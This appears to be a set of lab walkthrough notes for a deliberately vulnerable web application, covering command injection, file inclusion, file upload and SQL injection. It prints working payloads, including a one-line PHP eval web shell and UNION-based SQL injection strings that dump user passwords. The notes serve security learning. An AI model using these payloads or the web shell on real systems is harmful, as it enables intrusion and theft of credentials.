# 无效输入

## Command Injection

Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.

Ex: Use && to execute multiple commands: `127.0.0.1&&net user`

Ref: <https://www.freebuf.com/articles/web/116714.html>

## File Inclusion

File inclusion is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time.

1. Edit /etc/php/7.0/apache2/php.ini (in docker)
   * `allow_url_fopen = On`
     `allow_url_include = On`
   * Restart Apache: `/etc/init.d/apache2 restart`
2. Construct invalid URL to get the file path of the server. Ex: `http://localhost:port/vulnerabilities/fi/?page=/etc/test`
3. Upload a file to server and try to open it by using: `http://localhost:port/vulnerabilities/fi/?page=/serverpath/xxx`

Ref: <https://www.freebuf.com/articles/web/119150.html>

## File Upload

File inclusion is a type of web vulnerability where the server does not have strict control on uploaded files (file type, file content, etc). The attacker can upload malicious scripts like trojan, which could have destructive influence on the server.

1.  Upload a malicious file `hack.php`:

   ```
   <?php
   @eval($_POST['hacker'])
   ?>
   ```

   Ref: [One-line trajan](https://www.jianshu.com/p/90473b8e6667)

2. Use trojan horse tools to access the server and do what you want. 

Ref: <https://www.freebuf.com/articles/web/119467.html>

## SQL Injection

Insert malicious SQL statements into an entry field of execution. SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. 

1. Determine the type of injection
   * Enter `1`, the server will return the info of user 1.
   * Enter `1’or ‘1234 ’=’1234`, the server will return multiple results, which indicates there exists a character injection.
2. Determine the number of fields
   * Enter `1' or 1=1 order by 1 #`, `1' or 1=1 order by 2 #` ...
   * Test until the server does not return anything, the number of fields can be determined.
   * Determine the order of fields: `1' union select 1,2 #`, 
3. Get database: `1' union select 1,database() #`
4. Get all fields of database: `1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`
5. Download data: `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`

Ref: <https://www.freebuf.com/articles/web/120747.html>

## SQL Injection (Blind)

Different from normal SQL injection, the attacker can not see the result of executions (blind). In this case, the information that the attacker can use is very limited. 

Ex: Use the principle of dichotomy, see details in the reference.

Ref: <https://www.freebuf.com/articles/web/120985.html>